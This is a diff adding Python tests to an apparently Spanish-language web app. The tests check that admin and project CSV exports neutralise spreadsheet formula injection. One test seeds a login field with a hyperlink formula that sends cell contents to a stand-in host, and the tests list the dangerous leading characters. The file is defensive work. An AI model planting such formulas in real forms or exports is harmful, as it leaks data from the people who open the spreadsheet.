@@ -71,3 +71,35 @@ def test_cada_vista_publicada_se_puede_exportar(cliente):
     for vista in VISTAS:
         r = cliente.get(f"/admin/monitoreo/exportar.csv?vista={vista}&desde=2026-01-01")
         assert r.status_code == 200, vista
+
+
+def _celdas(texto: str) -> list[list[str]]:
+    import csv
+    import io
+    return list(csv.reader(io.StringIO(texto.removeprefix("\ufeff"))))
+
+
+def test_las_exportaciones_neutralizan_formulas_que_alguien_sin_cuenta_puede_sembrar(anonimo, cliente):
+    """El correo de un intento de ingreso fallido llega a la bitácora; si empieza por «=», la hoja de cálculo lo ejecutaría."""
+    anonimo.post("/entrar", data={"correo": '=hyperlink("http://x.example/?"&a1,"abrir")', "clave": "x"})
+    for ruta in ("/admin/monitoreo/exportar.csv?vista=v_h_evento", "/admin/kpis/exportar.csv?que=personas",
+                 "/admin/kpis/exportar.csv?que=kpis"):
+        r = cliente.get(ruta)
+        assert r.status_code == 200 and r.text.startswith("\ufeff"), ruta
+        celdas = [c for fila in _celdas(r.text) for c in fila]
+        assert not [c for c in celdas if c[:1] in ("=", "+", "@", "\t", "\r")], ruta
+    eventos = _celdas(cliente.get("/admin/monitoreo/exportar.csv?vista=v_h_evento").text)
+    assert any(c.startswith("'=hyperlink") for fila in eventos for c in fila)
+
+
+def test_el_csv_del_proyecto_deja_vacias_las_celdas_vacias_y_dice_quien_viaja(cliente):
+    proyecto = 905   # proyecto propio: no cambia las cifras de los demás
+    if not db.uno("select id from proyectos where id=:i", i=proyecto):
+        db.insertar("proyectos", id=proyecto, nombre="Proyecto de exportación", moneda="USD")
+    db.insertar("gastos", proyecto_id=proyecto, viajero_id=1, comercio="=1+1", estado="revision", creado=db.ahora())
+    r = cliente.get(f"/proyectos/{proyecto}/exportar.csv")
+    assert r.status_code == 200 and r.text.startswith("\ufeff")   # con BOM, la hoja de cálculo lee bien las tildes
+    encabezado, fila = _celdas(r.text)
+    datos = dict(zip(encabezado, fila, strict=True))
+    assert datos["comercio"] == "'=1+1" and datos["metodo_pago"] == "" and datos["fecha"] == ""
+    assert datos["viajero"] == db.uno("select nombre from viajeros where id=1")["nombre"] and datos["viaje"] == ""
